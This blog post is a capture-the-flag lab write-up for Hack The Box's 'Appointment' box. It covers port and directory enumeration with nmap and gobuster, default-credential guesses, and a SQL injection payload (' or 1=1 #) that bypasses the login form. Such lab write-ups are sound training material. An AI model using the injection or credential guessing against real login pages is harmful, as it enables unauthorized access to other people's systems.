---
layout: post
title: appointment
categories: htb
tags:
- htb
- starting_point
- appointment
author: nicoliboli
description: starting point | tier 1 | box 0
date: '2025-06-26 17:37:30 -0400'
---
# enumeration

```
$ nmap 10.129.152.21               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-26 16:58 EDT
Nmap scan report for 10.129.152.21
Host is up (0.096s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds

$ nmap -p- -T5 10.129.152.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-26 16:58 EDT
Warning: 10.129.152.21 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.152.21
Host is up (0.097s latency).
Not shown: 63439 closed tcp ports (conn-refused), 2095 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 518.78 seconds

$ nmap -sC -sV -p 80 10.129.152.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-26 17:01 EDT
Nmap scan report for 10.129.152.21
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
```

## port 80

see if `gobuster` finds any interesting subdirecties or files

```
$ gobuster dir -u http://10.129.152.21 -w /usr/share/wordlists/dirb/common.txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.152.21
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.152.21/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.152.21/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.152.21/images/]
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 301) [Size: 311] [--> http://10.129.152.21/js/]
/server-status        (Status: 403) [Size: 278]
/vendor               (Status: 301) [Size: 315] [--> http://10.129.152.21/vendor/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

nothing stands out there, so time to open the page in the web browser

![appointment_home](/assets/img/appointment_home.png)

# exploitation

try to login with a couple creds

[x] admin/admin
[x] root/root
[x] test/test

try a SQL injection to bypass the login. the check is probably a statement similar to `select * from users where username = 'USERNAME' and password = 'PASSWORD'` so the key is to enter a string of characters to make that statement always true. let's see if the application logs us in if there is no sanitization on the username. [this](https://portswigger.net/support/using-sql-injection-to-bypass-authentication) a pretty good resource on using SQLi to bypass login 

```
injection: ' or 1=1 #
username: admin
password: whatever
statement: select * from users where username = 'admin' or 1=1 #'' and password = 'whatever';
```

since the `'` and `#` characters are not sanitized, my statement ultimately reads `select * from users where username = 'admin' or 1=1 #` because of the comment. i don't even need the username, but it makes it more readable if its there. login and there is the flag

![apointment_login](/assets/img/appointment_login.png)

![appointment_flag](/assets/img/appointment_flag.png)